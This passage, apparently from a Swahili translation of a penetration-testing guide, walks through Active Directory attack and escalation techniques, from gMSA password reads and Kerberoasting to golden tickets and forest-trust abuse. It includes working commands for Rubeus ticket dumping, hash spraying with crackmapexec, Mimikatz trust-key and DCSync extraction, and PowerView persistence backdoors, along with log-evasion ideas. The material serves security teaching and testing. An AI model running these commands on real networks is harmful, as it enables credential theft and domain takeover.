# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Kisha tathmini gMSA iliyopatikana kama credential nyingine yoyote: kagua uanachama wa vikundi vya ndani/vya domain, haki za kuingia, SPN, delegation, na huduma zinazoweza kufikiwa kabla ya kujaribu pass-the-hash. Njia hii ya kupata taarifa kupitia ACL ni tofauti na [Golden gMSA/dMSA](golden-dmsa-gmsa.md), ambayo hukokotoa manenosiri yanayodhibitiwa baada ya kuathiri KDS root key.<sup>[[20]](#references)</sup>

Principal ya kompyuta inaweza pia kuwa na udhibiti wa kutoka kwenda kwa vitu vingine vya kompyuta au vikundi. Baada ya kuipata, kagua uanachama wake wa vikundi vilivyopachikwa na ACL zake zenye ufanisi kando: haki ya kuandika kwenye kitu kingine cha kompyuta inaweza kuwezesha kubadilisha akaunti, na haki za uanachama wa kikundi zinaweza kutoa jukumu la kuingia. Alama ya akaunti iliyotayarishwa, kanuni ya majina inayotabirika, au njia ya `GenericWrite` pekee haithibitishi njia nzima.

Nakala inayosomeka ya blob ya `msDS-ManagedPassword` iliyo kwenye faili, share, au nakala rudufu ni njia tofauti ya kuvuja kwa taarifa: ACL ya usomaji wa LDAP haiwezi kulinda nakala iliyohifadhiwa mahali pengine. Thibitisha kuwa data hiyo ni blob ya managed-password kabla ya kuitafsiri, na itofautishe na usomaji wa LDAP ulioidhinishwa na ukokotoaji unaotokana na KDS root key.

### Kerberoast

Kerberoasting huhusisha kupata **tiketi za TGS** zinazotumiwa na huduma zilizounganishwa na akaunti za watumiaji na kuvunja usimbaji wake—unaotegemea manenosiri ya watumiaji—**offline**.

Maelezo zaidi kuhusu hili yapo katika:


{{#ref}}
kerberoast.md
{{#endref}}

### Muunganisho wa mbali (RDP, SSH, FTP, Win-RM, n.k.)

Baada ya kupata credentials, unaweza kuangalia kama una ufikiaji wa **mashine** yoyote. Kwa hilo, unaweza kutumia **CrackMapExec** kujaribu kuunganisha kwenye seva kadhaa kwa kutumia protokali tofauti, kulingana na uchanganuzi wako wa port.

### Kuinua Haki za Ndani

Ikiwa umeathiri credentials au una session kama mtumiaji wa kawaida wa domain na unaweza kufikia **mashine yoyote kwenye domain**, tafuta njia ya **kuinua haki za ndani na kukusanya credentials**. Haki za msimamizi wa ndani zinaweza kukuwezesha **kutoa hash za watumiaji wengine** kutoka kwenye kumbukumbu (LSASS) na hifadhi ya ndani (SAM).

Kitabu hiki kina ukurasa kamili kuhusu [**kuinua haki za ndani katika Windows**](../windows-local-privilege-escalation/index.html) na [**orodha hakiki**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tiketi za Session ya Sasa

Ni **nadra sana** kupata **tiketi** katika **session** ya mtumiaji wa sasa zinazokupa ruhusa ya kufikia rasilimali usizotarajia, lakini unaweza kuangalia:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Ukiwa na domain credentials au session ya mtumiaji, pitia tena [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) za NTLM: mbinu za authenticated enumeration na coercion zinaweza kufichua njia za relay ambazo hazikupatikana wakati wa reconnaissance isiyohitaji uthibitishaji.

### Kutafuta Credentials katika Computer Shares | SMB Shares

Kwa kuwa sasa una credentials za msingi, unapaswa kuangalia kama unaweza **kupata** **faili zozote za kuvutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo mwenyewe, lakini ni kazi inayochosha na kurudiwa-rudiwa (hasa ukipata mamia ya nyaraka za kukagua).

[**Fuata kiungo hiki ili ujifunze kuhusu tools unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kuiba NTLM Credentials

Ikiwa unaweza **kufikia PCs au shares nyingine**, unaweza **kuweka faili** (kama faili ya SCF) ambazo zikifunguliwa kwa namna yoyote zita**sababisha uthibitishaji wa NTLM dhidi yako**, ili uweze **kuiba** **challenge ya NTLM** na kuipasua:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Athari hii ilimwezesha mtumiaji yeyote aliyethibitishwa **kucompromise domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Kupandisha privilege kwenye Active Directory UKIWA NA credentials/session zenye privilege

**Kwa mbinu zifuatazo, domain user wa kawaida hatoshi; unahitaji privileges/credentials maalum ili kutekeleza mashambulizi haya.**

### Uchotaji wa Hash

Tunatumaini umeweza **kucompromise akaunti ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), ikijumuisha relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), au [kupandisha privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa kudump hashes zote zilizo kwenye memory na zilizo kwenye mfumo wa ndani.\
[**Soma ukurasa huu kuhusu njia mbalimbali za kupata hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara tu unapokuwa na hash ya mtumiaji**, unaweza kuitumia **kujifanya kuwa yeye**.\
Unahitaji kutumia **tool** itakayo**fanya** **uthibitishaji wa NTLM kwa kutumia** **hash** hiyo, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** **hash** hiyo ndani ya **LSASS**, ili **hash hiyo itumike kila uthibitishaji wa NTLM unapofanywa.** Hilo ndilo chaguo la mwisho linalofanywa na mimikatz.\
[**Soma ukurasa huu kwa maelezo zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulizi hili linalenga **kutumia NTLM hash ya mtumiaji kuomba Kerberos tickets**, kama mbadala wa Pass The Hash ya kawaida kupitia itifaki ya NTLM. Kwa hiyo, linaweza kuwa **muhimu hasa kwenye mitandao ambako itifaki ya NTLM imezimwa** na **Kerberos pekee ndiyo inaruhusiwa** kama itifaki ya uthibitishaji.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya shambulizi ya **Pass The Ticket (PTT)**, washambuliaji **huiba authentication ticket ya mtumiaji** badala ya password au hash yake. Kisha ticket hii iliyoibwa hutumika **kujifanya kuwa mtumiaji huyo**, na hivyo kupata ufikiaji usioidhinishwa wa resources na services ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Kutumia Tena Credentials

Ikiwa una **hash** au **password** ya **local administrato**r, unapaswa kujaribu **kuingia locally** kwenye **PCs** nyingine ukitumia hiyo.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Kumbuka kuwa hili lina **kelele nyingi** na **LAPS** inaweza kulidhibiti.

### Matumizi Mabaya ya MSSQL na Trusted Links

Ikiwa mtumiaji ana privileges za **kufikia instances za MSSQL**, anaweza kuzitumia **kutekeleza commands** kwenye host ya MSSQL (ikiwa inaendeshwa kama SA), **kuiba** **hash** ya NetNTLM, au hata kufanya **relay attack**.\
Ikiwa instance ya MSSQL imeunganishwa kwa trust kupitia database link kutoka instance nyingine, mtumiaji mwenye privileges kwenye database iliyounganishwa anaweza **kutumia uhusiano huo wa trust kutekeleza queries kwenye instance nyingine**. Trust hizi zinaweza kuunganishwa kwa mfuatano na hatimaye kufikia database iliyosanidiwa vibaya ambako mtumiaji anaweza kutekeleza commands.\
**Links kati ya databases hufanya kazi hata kupitia forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Matumizi mabaya ya majukwaa ya usimamizi wa rasilimali za IT na deployment

Mara nyingi, suites za wahusika wengine za inventory na deployment hufichua njia zenye nguvu za kupata credentials na kutekeleza code. Tazama:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ukipata Computer object yoyote yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una privileges za domain kwenye computer hiyo, utaweza kudump TGT kutoka kwenye memory ya kila mtumiaji anayeingia kwenye computer hiyo.\
Kwa hiyo, ikiwa **Domain Admin ataingia kwenye computer hiyo**, utaweza kudump TGT yake na kujifanya yeye kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Kwa kutumia constrained delegation, unaweza hata **kucompromise Print Server kiotomatiki** (kwa matumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa user au computer imeruhusiwa kutumia "Constrained Delegation", itaweza **kujiwakilisha kama user yeyote ili kufikia baadhi ya services kwenye computer**.\
Kisha, uki **compromise hash** ya user/computer huyo, utaweza **kujiwakilisha kama user yeyote** (hata domain admins) ili kufikia baadhi ya services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na privilege ya **WRITE** kwenye Active Directory object ya computer ya mbali huwezesha kupata code execution yenye **privileges zilizoinuliwa**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Matumizi mabaya ya Permissions/ACLs

Mtumiaji aliyecompromise anaweza kuwa na **privileges za kuvutia kwenye baadhi ya domain objects** zinazoweza kukuwezesha **kuhamia** kwenye mifumo mingine kando/**kuinua** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Matumizi mabaya ya huduma ya Printer Spooler

Kugundua **huduma ya Spool inayosikiliza** ndani ya domain kunaweza **kutumiwa vibaya** ili **kupata credentials mpya** na **kuinua privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Matumizi mabaya ya sessions za wahusika wengine

Ikiwa **watumiaji wengine** **wanafikia** mashine **iliyo compromise**, inawezekana **kukusanya credentials kutoka kwenye memory** na hata **kuingiza beacons kwenye processes zao** ili kujifanya wao.\
Kwa kawaida watumiaji hufikia mfumo kupitia RDP, kwa hiyo hapa kuna maelekezo ya kufanya mashambulizi kadhaa dhidi ya sessions za RDP za wahusika wengine:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **nenosiri la Administrator wa ndani** kwenye computers zilizounganishwa kwenye domain, na kuhakikisha kuwa **linabadilishwa bila mpangilio**, ni la kipekee, na **hubadilishwa** mara kwa mara. Password hizi huhifadhiwa kwenye Active Directory na ufikiaji wake hudhibitiwa kupitia ACLs ili uruhusiwe kwa watumiaji walioidhinishwa pekee. Ukiwa na permissions za kutosha kufikia password hizi, unaweza kuhamia kwenye computers nyingine.


{{#ref}}
laps.md
{{#endref}}

### Wizi wa Certificate

**Kukusanya certificates** kutoka kwenye mashine iliyo compromise kunaweza kuwa njia ya kuinua privileges ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Matumizi mabaya ya Certificate Templates

Ikiwa **templates zilizo hatarini** zimesanidiwa, inawezekana kuzitumia vibaya ili kuinua privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation kwa kutumia akaunti yenye privileges za juu

### Kudump Domain Credentials

Mara tu unapopata privileges za **Domain Admin** au bora zaidi **Enterprise Admin**, unaweza **kudump** **database ya domain**: _ntds.dit_.

[**Maelezo zaidi kuhusu DCSync attack yanapatikana hapa**](dcsync.md).

[**Maelezo zaidi kuhusu jinsi ya kuiba NTDS.dit yanapatikana hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Backup archive inayosomeka na iliyo na `ntds.dit` pamoja na hive ya `SYSTEM` inapaswa kuchukuliwa kuwa nyenzo za directory zilizofichuliwa hata kabla ya kutoa yaliyomo. Hash ya password iliyopitwa na wakati haimaanishi kuwa attributes nyingine za object ziko salama: sehemu kama `description` zinaweza kuwa na credentials au maelezo ya kiutendaji. Kagua majina ya archive members kwanza na usijumuishe yaliyomo kwenye database yaliyotolewa kwenye matokeo ya kawaida ya enumeration.

### Privesc kama Persistence

Baadhi ya techniques zilizojadiliwa hapo awali zinaweza kutumika kwa persistence.\
Kwa mfano, unaweza:

- Kuwafanya watumiaji wawe hatarini kwa [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Wafanya watumiaji wawe katika hatari ya [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Mpe mtumiaji ruhusa za [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** huunda tiketi halali ya **Ticket Granting Service (TGS)** kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya akaunti ya PC**). Mbinu hii hutumiwa kupata **ruhusa za huduma**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** huhusisha mshambuliaji kupata **NTLM hash ya akaunti ya krbtgt** katika mazingira ya Active Directory (AD). Akaunti hii ni maalum kwa sababu hutumika kusaini **Ticket Granting Tickets (TGTs)** zote, ambazo ni muhimu kwa uthibitishaji ndani ya mtandao wa AD.

Mshambuliaji akishapata hash hii, anaweza kuunda **TGTs** za akaunti yoyote atakayochagua (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets, lakini zimeghushiwa kwa njia inayoweza **kuepuka mifumo ya kawaida ya kugundua golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za akaunti au kuweza kuziomba** ni njia nzuri sana ya kudumisha ufikiaji wa akaunti ya mtumiaji (hata akibadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Pia inawezekana kutumia certificates kudumisha ufikiaji wenye privileges za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Objekti ya **AdminSDHolder** katika Active Directory hulinda **vikundi vyenye privileges za juu** (kama vile Domain Admins na Enterprise Admins) kwa kutumia **Access Control List (ACL)** sanifu kwenye vikundi hivi ili kuzuia mabadiliko yasiyoidhinishwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; mshambuliaji akibadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo hupata udhibiti mkubwa juu ya vikundi vyote vyenye privileges za juu. Kwa hiyo, hatua hii ya usalama iliyokusudiwa kulinda inaweza kuwa na matokeo kinyume, na kuruhusu ufikiaji usioidhinishwa isipofuatiliwa kwa karibu.

[**Pata maelezo zaidi kuhusu AdminDSHolder Group hapa.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Ndani ya kila **Domain Controller (DC)**, kuna akaunti ya **local administrator**. Kwa kupata haki za admin kwenye mashine hiyo, hash ya local Administrator inaweza kutolewa kwa kutumia **mimikatz**. Baada ya hapo, ni lazima kufanya mabadiliko kwenye registry ili **kuwezesha matumizi ya password hii**, na hivyo kuruhusu ufikiaji wa mbali wa akaunti ya local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Unaweza **kumpa** **mtumiaji** **ruhusa maalum** kwenye objekti fulani za domain, zitakazomwezesha **kupandisha privileges baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** hutumika **kuhifadhi** **ruhusa** ambazo **objekti** inazo **juu ya** **objekti** nyingine. Ukiweza tu kufanya **mabadiliko madogo** kwenye **security descriptor** ya objekti, unaweza kupata privileges muhimu sana juu ya objekti hiyo bila kuhitaji kuwa mwanachama wa kikundi chenye privileges za juu.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia vibaya auxiliary class ya `dynamicObject` kuunda principals/GPOs/DNS records za muda mfupi zenye `entryTTL`/`msDS-Entry-Time-To-Die`; hujifuta zenyewe bila tombstones, na kufuta ushahidi wa LDAP huku zikiziacha SIDs zisizo na wenza, marejeleo yaliyovunjika ya `gPLink`, au majibu ya DNS yaliyohifadhiwa kwenye cache (kwa mfano, uchafuzi wa ACE wa AdminSDHolder au uelekezaji upya hasidi wa `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** iliyo kwenye memory ili kuweka **password ya jumla**, inayotoa ufikiaji wa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Jifunze SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kunasa** **credentials** zinazotumika kufikia mashine zikiwa katika **clear text**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Husajili **Domain Controller** mpya katika AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwenye objekti zilizobainishwa **bila** kuacha **logs** zozote kuhusu **mabadiliko hayo**. Unahitaji privileges za **DA** na lazima uwe ndani ya **root domain**.\
Kumbuka kwamba ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Hapo awali tulijadili jinsi ya kupandisha privileges ikiwa una **ruhusa za kutosha kusoma passwords za LAPS**. Hata hivyo, passwords hizi pia zinaweza kutumiwa **kudumisha persistence**.\
Angalia:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft huichukulia **Forest** kuwa mpaka wa usalama. Hii inamaanisha kuwa **kuhatarisha domain moja kunaweza kusababisha Forest nzima kuhatarishwa**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni utaratibu wa usalama unaomwezesha mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Kimsingi, huunda muunganisho kati ya mifumo ya uthibitishaji ya domain hizo mbili, na kuruhusu uthibitishaji kufanyika kwa urahisi kati yao. Domain zinapoanzisha trust, hubadilishana na kuhifadhi **keys** maalum ndani ya **Domain Controllers (DCs)** zao, ambazo ni muhimu kwa uadilifu wa trust.

Katika hali ya kawaida, mtumiaji anapotaka kufikia huduma katika **domain inayoaminiwa**, lazima kwanza aombe tiketi maalum inayoitwa **inter-realm TGT** kutoka kwa DC ya domain yake. TGT hii husimbwa kwa **key** ya pamoja ambayo domain zote mbili zimekubaliana kuitumia. Kisha mtumiaji huwasilisha TGT hii kwa **DC ya domain inayoaminiwa** ili kupata tiketi ya huduma (**TGS**). DC ya domain inayoaminiwa ikithibitisha kwa mafanikio inter-realm TGT, hutoa TGS inayompa mtumiaji ufikiaji wa huduma hiyo.

**Hatua**:

1. **Kompyuta ya mteja** katika **Domain 1** huanza mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** yake.
2. DC1 hutoa TGT mpya ikiwa mteja amethibitishwa kwa mafanikio.
3. Kisha mteja huomba **inter-realm TGT** kutoka kwa DC1, ambayo inahitajika ili kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT husimbwa kwa **trust key** inayoshirikiwa kati ya DC1 na DC2 kama sehemu ya domain trust ya pande mbili.
5. Mteja hupeleka inter-realm TGT kwa **Domain Controller ya Domain 2 (DC2)**.
6. DC2 huthibitisha inter-realm TGT kwa kutumia trust key ya pamoja na, ikiwa ni halali, hutoa **Ticket Granting Service (TGS)** ya server katika Domain 2 ambayo mteja anataka kufikia.
7. Hatimaye, mteja huwasilisha TGS hii kwa server, ikiwa imesimbwa kwa hash ya akaunti ya server, ili kupata ufikiaji wa huduma katika Domain 2.

### Different trusts

Ni muhimu kutambua kuwa **trust inaweza kuwa ya upande 1 au pande 2**. Katika chaguo la pande 2, domain zote mbili huaminiana; lakini katika uhusiano wa trust wa **upande 1**, domain moja huwa **inayoaminiwa** na nyingine huwa **inayoamini**. Katika hali ya pili, **utaweza tu kufikia rasilimali zilizo ndani ya domain inayoamini kutoka kwenye domain inayoaminiwa**.

Ikiwa Domain A inaiamini Domain B, A ndiyo domain inayoamini na B ndiyo domain inayoaminiwa. Zaidi ya hayo, katika **Domain A**, huu utakuwa **Outbound trust**; na katika **Domain B**, utakuwa **Inbound trust**.

**Aina tofauti za uhusiano wa trust**

- **Parent-Child Trusts**: Huu ni mpangilio wa kawaida ndani ya forest moja, ambapo child domain huwa na trust ya pande mbili na inayopitishwa (transitive) na parent domain yake moja kwa moja. Kimsingi, hii inamaanisha kuwa maombi ya uthibitishaji yanaweza kupita kwa urahisi kati ya parent na child.
- **Cross-link Trusts**: Hizi huitwa pia "shortcut trusts", na huanzishwa kati ya child domains ili kuharakisha mchakato wa uelekezaji wa marejeo. Katika forest changamano, marejeo ya uthibitishaji kwa kawaida hulazimika kupita juu hadi forest root kisha kushuka hadi domain lengwa. Kuunda cross-links hufupisha njia hiyo, jambo ambalo husaidia hasa katika mazingira yaliyotawanyika kijiografia.
- **External Trusts**: Hizi huanzishwa kati ya domain tofauti zisizohusiana na kwa asili hazipitishwi (non-transitive). Kulingana na [nyaraka za Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts husaidia kufikia rasilimali katika domain iliyo nje ya forest ya sasa ambayo haijaunganishwa kupitia forest trust. Usalama huimarishwa kwa SID filtering katika external trusts.
- **Tree-root Trusts**: Trust hizi huanzishwa moja kwa moja kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazikutaniwa mara nyingi, tree-root trusts ni muhimu kwa kuongeza domain trees mpya kwenye forest, na kuziwezesha kuwa na jina la domain la kipekee na kuhakikisha trust ya pande mbili inayopitishwa. Maelezo zaidi yanapatikana katika [mwongozo wa Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni trust ya pande mbili inayopitishwa kati ya forest root domains mbili, na pia hutumia SID filtering ili kuimarisha usalama.
- **MIT Trusts**: Trust hizi huanzishwa na Kerberos domains zisizo za Windows zinazotii [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalum zaidi na hufaa kwa mazingira yanayohitaji kuunganishwa na mifumo inayotumia Kerberos nje ya mfumo wa Windows.

#### Tofauti nyingine katika **uhusiano wa trust**

- Uhusiano wa trust unaweza pia **kupitishwa (transitive)** (A inaiamini B, B inaiamini C, basi A inaiamini C) au **kutopitishwa (non-transitive)**.
- Uhusiano wa trust unaweza kusanidiwa kuwa **trust ya pande mbili** (kila upande unauamini mwingine) au **trust ya upande mmoja** (upande mmoja tu ndio unaomwamini mwingine).

### Attack Path

1. **Orodhesha** mahusiano ya trust
2. Angalia kama **security principal** yoyote (mtumiaji/kikundi/kompyuta) ina **ufikiaji** wa rasilimali za **domain nyingine**, labda kupitia maingizo ya ACE au kwa kuwa mwanachama wa vikundi vya domain nyingine. Tafuta **mahusiano kati ya domain** (huenda ndiyo sababu trust iliundwa).
   1. Katika hali hii, kerberoast inaweza kuwa chaguo jingine.
3. **Hatarisha** **akaunti** zinazoweza kutumika **kuhamia** kati ya domain.

Washambuliaji wanaoweza kufikia rasilimali katika domain nyingine wanaweza kufanya hivyo kupitia njia kuu tatu:

- **Uanachama wa Local Group**: Principals wanaweza kuongezwa kwenye local groups kwenye mashine, kama vile kikundi cha “Administrators” kwenye server, na hivyo kupata udhibiti mkubwa wa mashine hiyo.
- **Uanachama wa Kikundi cha Foreign Domain**: Principals wanaweza pia kuwa wanachama wa vikundi vilivyo ndani ya foreign domain. Hata hivyo, ufanisi wa njia hii hutegemea aina ya trust na upeo wa kikundi.
- **Access Control Lists (ACLs)**: Principals wanaweza kubainishwa katika **ACL**, hasa kama huluki ndani ya **ACEs** katika **DACL**, na hivyo kupewa ufikiaji wa rasilimali maalum. Kwa wanaotaka kuelewa zaidi jinsi ACLs, DACLs na ACEs zinavyofanya kazi, whitepaper yenye kichwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni nyenzo muhimu sana.<sup>[[17]](#references)</sup>

### Tafuta watumiaji/vikundi vya nje vyenye ruhusa

Unaweza kuangalia **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals katika domain. Hawa watakuwa watumiaji/vikundi kutoka **domain/forest ya nje**.

Unaweza kuangalia hili katika **Bloodhound** au kutumia powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Njia nyingine za kuorodhesha domain trusts:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Kuna **funguo 2 zinazoaminika**, moja ya _Child --> Parent_ na nyingine ya _Parent_ --> _Child_.\
> Unaweza kupata ile inayotumiwa na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Pata haki za Enterprise admin katika domain ya child/parent kwa kutumia vibaya trust kupitia SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Tumia vibaya Configuration NC inayoweza kuandikwa

Ni muhimu kuelewa jinsi Configuration Naming Context (NC) inavyoweza kutumiwa vibaya. Configuration NC hutumika kama hifadhi kuu ya data ya usanidi katika forest kwenye mazingira ya Active Directory (AD). Data hii hurudiwa kwa kila Domain Controller (DC) ndani ya forest, huku DC zinazoweza kuandikwa zikihifadhi nakala ya Configuration NC inayoweza kuandikwa. Ili kutumia vibaya hili, ni lazima uwe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Unganisha GPO na site ya root DC**

Kontena la Sites la Configuration NC lina taarifa kuhusu site za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kutumia SYSTEM privileges kwenye DC yoyote, washambuliaji wanaweza kuunganisha GPO kwenye site za root DC. Hatua hii inaweza kuhatarisha root domain kwa kurekebisha sera zinazotumika kwenye site hizi.

Kwa maelezo ya kina, unaweza kusoma utafiti kuhusu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Hatarisha gMSA yoyote katika forest**

Njia moja ya mashambulizi ni kulenga gMSA zenye privileges ndani ya domain. KDS Root key, inayohitajika kukokotoa passwords za gMSA, huhifadhiwa ndani ya Configuration NC. Ukiwa na SYSTEM privileges kwenye DC yoyote, unaweza kufikia KDS Root key na kukokotoa passwords za gMSA yoyote katika forest.

Uchanganuzi wa kina na mwongozo wa hatua kwa hatua unapatikana hapa:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Shambulizi la ziada dhidi ya MSA zilizokabidhiwa (BadSuccessor – kutumia vibaya sifa za migration):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Utafiti mwingine wa nje: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Shambulizi la kubadilisha Schema**

Mbinu hii inahitaji subira, kwa kuwa ni lazima usubiri hadi vitu vipya vya AD vyenye privileges viundwe. Kwa SYSTEM privileges, mshambuliaji anaweza kurekebisha AD Schema ili kumpa mtumiaji yeyote udhibiti kamili wa classes zote. Hili linaweza kusababisha ufikiaji na udhibiti usioidhinishwa wa vitu vipya vya AD vitakavyoundwa.

Maelezo zaidi yanapatikana kwenye [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Kutoka DA hadi EA kwa kutumia ADCS ESC5**

Athari ya ADCS ESC5 hulenga udhibiti wa vitu vya Public Key Infrastructure (PKI), ili kuunda certificate template inayowezesha kujithibitisha kama mtumiaji yeyote ndani ya forest. Kwa kuwa vitu vya PKI viko ndani ya Configuration NC, kuhatarisha child DC inayoweza kuandikwa huwezesha kutekeleza mashambulizi ya ESC5.

